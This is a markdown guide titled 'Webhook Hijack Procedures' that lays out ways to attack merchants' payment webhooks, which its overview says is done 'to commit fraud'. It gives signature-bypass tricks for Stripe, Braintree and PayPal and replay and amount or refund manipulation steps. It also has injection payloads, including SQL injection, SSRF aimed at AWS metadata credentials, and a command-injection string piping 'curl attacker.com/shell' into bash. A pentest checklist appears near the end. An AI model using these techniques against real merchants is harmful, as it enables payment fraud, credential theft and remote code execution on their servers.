# Webhook Hijack Procedures

## Overview

Payment webhooks are callback URLs that notify merchants of transaction events. Attacking webhooks means intercepting, manipulating, or replaying payment notifications to commit fraud.

## Webhook Architecture

```
Webhook flow:
Merchant server → processor registers URL (e.g., https://merchant.com/webhook)
Buyer → pays → processor → POSTs transaction confirmation to merchant webhook

Common webhook providers:
- Stripe: /webhook, signature: Stripe-Signature header
- Braintree: /webhooks, signature: HMAC-SHA256 in BFSignature
- PayPal: /ipn, signature: PayPal authentication
- Square: /webhooks, signature: Square signature
- Adyen: /notification, signature: HMAC-SHA256
- Custom: varies
```

## Attack Vectors

### 1. Webhook Endpoint Discovery

```
Discovery methods:
1. Source code leak (GitHub, config files)
   - search: "webhook" "callback" "ipn" in repo
   - find: /webhook, /notify, /ipn, /callback, /notifications

2. Network enumeration
   - Common paths: /webhook, /ipn, /notify, /callback, /payment/webhook
   - Brute force subdirectory enumeration

3. Provider documentation leak
   - Stripe docs → webhook URL pattern exposed
   - If merchant uses default path: discoverable

4. Error message disclosure
   - Send random POST to merchant domain
   - Error may reveal webhook URL
```

### 2. Webhook Signature Bypass

```
Stripe signature bypass:
A. Clock skew
   - Stripe validates timestamp (tolerance: 300 seconds)
   - Replay captured webhook beyond tolerance window
   - If server doesn't validate: bypass

B. Raw body bypass
   - Stripe signature computed over raw request body
   - If server processes body as JSON then validates: race condition
   - Send: body = JSON (validates), then modified body (processed)

C. Missing signature validation
   - Server receives webhook but doesn't validate Stripe-Signature
   - Test: send webhook without Stripe-Signature header
   - If accepted: full webhook manipulation

D. Multiple signature headers
   - Stripe-Signature: t=1,v1=abc
   - Add second Stripe-Signature: t=2,v1=xyz
   - If server processes second one: bypass

General bypass checklist:
- Send without signature header
- Send with empty signature
- Send with invalid timestamp
- Send with tampered signature
- Send with old timestamp (>5 min)
- Send with multiple signature headers
```

### 3. Webhook Replay Attack

```
Vulnerability: Webhook is not idempotent, accepts replay.

Attack:
1. Capture legitimate webhook from test purchase
   POST /webhook { "type": "payment_intent.succeeded", "amount": 1000 }

2. Replay with modified amount
   POST /webhook { "type": "payment_intent.succeeded", "amount": 1000000 }

3. If merchant fulfills high-value order:
   - Attacker paid $10 test → got $10,000 product
   - Merchant paid out for $1M webhook → fraud

Idempotency test:
1. Make test purchase → capture webhook
2. Resend same webhook
3. Server should ignore duplicate (idempotency key check)
4. If accepted → webhook is exploitable
```

### 4. Webhook Manipulation

```
A. Amount manipulation
   - Change amount in webhook payload
   - Merchant fulfills order at manipulated price
   - Attack: cheap purchase → webhook says high value

B. Status manipulation
   - Capture webhook for successful payment
   - Replay for failed payment
   - Trigger refund for already-processed order

C. Event type manipulation
   - Capture payment_intent.succeeded webhook
   - Replay as charge.refunded
   - If merchant doesn't validate event type: refund fraud
```

### 5. Webhook Injection

```
A. SQL injection in webhook handler
   POST /webhook
   { "id": "evt_123' OR 1=1 --" }

   If server reflects this in query:
   → Extract card data, transaction records

B. SSRF via webhook URL
   POST /webhook
   { "url": "http://169.254.169.254/latest/meta-data/" }

   If server fetches this URL as part of processing:
   → AWS metadata exfil (access keys, tokens)

C. Command injection in webhook params
   POST /webhook
   { "email": "test@example.com; curl attacker.com/shell|bash" }

   If server uses params unsanitized:
   → RCE on merchant server
```

### 6. Webhook Endpoint Hijacking

```
Vulnerability: Merchant webhook URL is predictable or default.

Attack:
1. Enumerate merchant webhook URL
   - Default patterns: /webhook/stripe, /api/webhook, /payment/callback
   - If predictable: attacker can register same URL
   - Real payments → attacker's server → fraud

Prevention: Merchant should use non-guessable webhook URL
Attack success: requires predictable URL + processor doesn't validate URL ownership
```

## Provider-Specific Attacks

### Stripe

```
Endpoints: /webhook (raw body required)
Signature: Stripe-Signature (HMAC-SHA256, timestamp + body)

Bypass techniques:
1. Remove Stripe-Signature header
2. Use old timestamp (server may not validate)
3. Inject additional data in JSON body
4. Use null byte in signature header

Key endpoints:
- payment_intent.succeeded → fulfillment trigger
- charge.refunded → refund processing
- customer.created → account creation trigger
```

### Braintree

```
Endpoints: /webhooks
Signature: BFSignature (HMAC-SHA256)

Bypass:
1. replay_id parameter manipulation
2. Multiple BFSignature headers
3. Missing signature validation
```

### PayPal IPN

```
Endpoints: /ipn
Signature: PayPal validation via POST to paypal.com

Attack:
1. Capture IPN message
2. Replay to merchant
3. Don't validate at PayPal (merchant skips validation)
```

## Testing Checklist

```
[ ] Webhook URL discovered
[ ] Signature bypass tested (no header, empty, invalid, old)
[ ] Webhook replay tested (same webhook sent twice)
[ ] Amount manipulation tested
[ ] Event type manipulation tested
[ ] Status manipulation tested (succeeded → refunded)
[ ] SQL injection in webhook params tested
[ ] SSRF in webhook URL tested
[ ] Command injection tested
[ ] Webhook endpoint hijacking attempted
[ ] Idempotency key tested (duplicate accepted?)
[ ] Clock skew test (>5 min old)
[ ] Multiple signature headers test
```

## Evidence Preservation

- Full webhook request/response capture
- PCAP of webhook traffic
- Screenshot of successful manipulation
- Hash of captured webhook signatures